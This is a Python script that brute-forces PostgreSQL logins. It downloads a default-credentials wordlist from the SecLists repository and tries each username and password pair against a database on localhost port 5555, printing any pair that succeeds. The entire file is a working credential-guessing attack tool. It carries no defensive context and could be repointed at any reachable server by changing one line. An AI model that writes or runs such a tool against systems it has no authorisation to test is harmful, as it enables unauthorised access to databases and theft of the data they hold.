import psycopg2
import requests

host = "localhost"
port = "5555"
dbname = "postgres"


# Function to attempt connecting to the database
def try_password(username,password):
    try:
        # Try to establish a connection using the given password
        connection = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=username,
            password=password
        )
        cursor = connection.cursor()

        # If connection is successful, print the PostgreSQL version
        cursor.execute("SELECT version();")
        db_version = cursor.fetchone()
        print(f"Connected to PostgreSQL database. Version: {db_version[0]}")
        print(f"Username: {username}")
        print(f"Password: {password}")

        # Close connection after success
        cursor.close()
        connection.close()
        return True
    except psycopg2.OperationalError:
        # Catch the error if the password is incorrect
        return False
# URL of the text file containing common passwords
password_file_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt"

def download_password_file(url):
    response = requests.get(url)
    if response.status_code == 200:
        templist= response.text.splitlines()
        ret_list=[]
        for pswd in templist:
            ret_list.append((pswd.split(":")[0],pswd.split(":")[1]))
        return ret_list
    else:
        print("Failed to download the password file.")
        return []

def brute_force_with_passwords(password_list):
    for password in password_list:
        print(f"Trying username: {password[0]} with password: {password[1]}")
        if try_password(password[0],password[1]):
            print("Password cracked successfully!")
            break
        else:
            print("Incorrect password.")

# Download the password file
password_list = download_password_file(password_file_url)

# Start brute-forcing
if password_list:
    brute_force_with_passwords(password_list)
else:
    print("No passwords to try.")